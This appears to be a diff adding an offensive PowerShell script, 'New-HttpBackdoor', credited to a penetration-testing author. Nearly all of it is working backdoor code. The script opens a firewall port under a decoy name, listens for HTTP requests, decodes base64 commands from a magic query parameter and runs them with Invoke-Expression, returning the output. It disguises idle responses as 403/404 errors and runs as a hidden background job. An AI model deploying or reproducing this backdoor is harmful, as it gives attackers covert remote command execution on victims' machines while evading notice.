@@ -1,0 +1,91 @@
+function New-HttpBackdoor {
+<#
+.NAME
+   New-HttpBackdoor
+
+.SYNOPSIS
+ 
+    New-HttpBackdoor
+    
+    Author: Chris Campbell (@obscuresec)
+    License: BSD 3-Clause
+    
+.DESCRIPTION
+
+    This function creates an HTTP backdoor on a specified port as a background job.
+   
+.LINK
+
+    http://www.obscuresec.com/
+
+.NOTES
+
+    This script won't be used in the normal fashion and should be tailored by specifying the port.
+
+#>
+    $ScriptBlock = {
+        function HttpBackdoor {
+            $ListenPort = 80
+            $MagicString = 'api/settings/session='
+
+            $FirewallObject = New-Object -Com HNetCfg.FwMgr
+            $FwProfile = $FirewallObject.LocalPolicy.CurrentProfile
+
+            if ($FwProfile.FirewallEnabled) {
+                $FwPort = New-Object -ComObject HNetCfg.FWOpenPort
+                $FwPort.Port = $ListenPort
+                $FwPort.Name = 'NetappFiler'
+                $FwPort.Enabled = $True    
+        
+                $FwProfiles = @{
+                    NET_FW_PROFILE_DOMAIN = 0
+                    NET_FW_PROFILE_STANDARD = 1
+                }
+
+                $FwProfile.GloballyOpenPorts.Add($ListenPort)
+                    foreach ($FwProfileKey in $FwProfiles.Keys) {
+                        $Profile = $FirewallObject.LocalPolicy.GetProfileByType($FwProfiles[$FwProfileKey])
+                        $Profile.GloballyOpenPorts.Add($ListenPort)
+                }
+            }
+          
+            $HttpListenerObject = New-Object Net.HttpListener
+            $ObjectPrefix = "http://*:$ListenPort/"
+            foreach ($Object in $ObjectPrefix) {$HttpListenerObject.Prefixes.Add($Object)}
+            $HttpListenerObject.Start()
+
+            $Continue = $True
+
+            while ($Continue) {
+              $ListenerContext = $HttpListenerObject.GetContext()
+              $HttpResponse = $ListenerContext.Response
+              $HttpResponse.Headers.Add("Content-Type","text/plain")
+              $StreamWriterObject = New-Object IO.StreamWriter($HttpResponse.OutputStream,[Text.Encoding]::UTF8)
+              $HttpRequest = $ListenerContext.Request  
+              $EncodedHttpParameter = $HttpRequest.QueryString["$MagicString"]
+              $CommandBytes  = [System.Convert]::FromBase64String($EncodedHttpParameter);
+              $HttpParameter = [System.Text.Encoding]::UTF8.GetString($CommandBytes)
+          
+              switch ($HttpParameter) {
+                "Exit" {$Continue = $False; break}
+                $Null {$StreamWriterObject.WriteLine("HTTP Error 403: Forbidden"); break}
+                default {
+                   $Count = 0
+                   Invoke-Expression $HttpParameter | Out-String -Stream |
+                      foreach {
+                         $StreamWriterObject.WriteLine($_.TrimEnd())
+                         $Count++
+                      }
+
+                  if ($Count -eq 0) {$StreamWriterObject.WriteLine('HTTP Error 404: Not Found')}
+                }
+              }
+          
+              $StreamWriterObject.Close()
+
+            }
+            $HttpListenerObject.Stop()
+        }
+    }
+    Start-job -InitializationScript $ScriptBlock -ScriptBlock {HttpBackdoor} | Out-Null
+}
